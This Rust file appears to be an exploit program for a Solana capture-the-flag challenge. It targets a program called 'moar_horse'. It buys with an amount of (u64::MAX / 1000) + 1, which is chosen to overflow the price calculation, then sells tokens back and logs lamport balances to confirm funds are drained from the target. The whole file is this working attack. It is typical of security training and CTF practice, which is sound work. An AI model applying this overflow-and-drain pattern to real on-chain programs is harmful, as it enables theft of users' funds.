use borsh::{BorshSerialize, to_vec};

use solana_program::{
  account_info::{
    next_account_info,
    AccountInfo,
  },
  entrypoint::ProgramResult,
  instruction::{
    AccountMeta,
    Instruction,
  },
  program::invoke,
  pubkey::Pubkey,
  system_program,
  msg,
};

use moar_horse::HorseInstruction;

pub fn process_instruction(_program: &Pubkey, accounts: &[AccountInfo], _data: &[u8]) -> ProgramResult {
  let account_iter = &mut accounts.iter();
  let moarhorse = next_account_info(account_iter)?;
  let user = next_account_info(account_iter)?;
  let horse = next_account_info(account_iter)?;
  let wallet = next_account_info(account_iter)?;

  let amount = (u64::MAX / 1000) + 1;
  msg!("Amount to buy: {}", amount);

  // print via msg the amount each of user horse and wallet have
  msg!("Starting balance");
  msg!("user: {}", user.lamports());
  msg!("horse: {}", horse.lamports());
  msg!("wallet: {}", wallet.lamports());

  invoke(
    &Instruction {
      program_id: *moarhorse.key,
      accounts: vec![
        AccountMeta::new(*horse.key, false),
        AccountMeta::new(*wallet.key, false),
        AccountMeta::new(*user.key, true),
        AccountMeta::new_readonly(system_program::id(), false),
      ],
      data: to_vec(&HorseInstruction::Buy { amount }).unwrap(),
    },
    &[horse.clone(), wallet.clone(), user.clone()],
  )?;

  msg!("After first purchase");
  msg!("user: {}", user.lamports());
  msg!("horse: {}", horse.lamports());
  msg!("wallet: {}", wallet.lamports());

  invoke(
    &Instruction {
      program_id: *moarhorse.key,
      accounts: vec![
        AccountMeta::new(*horse.key, false),
        AccountMeta::new(*wallet.key, false),
        AccountMeta::new(*user.key, true),
        AccountMeta::new_readonly(system_program::id(), false),
      ],
      data: to_vec(&HorseInstruction::Sell { amount: 9000000 }).unwrap(),
    },
    &[horse.clone(), wallet.clone(), user.clone()],
  )?;

  msg!("After selling");
  msg!("user: {}", user.lamports());
  msg!("horse: {}", horse.lamports());
  msg!("wallet: {}", wallet.lamports());

  Ok(())
}
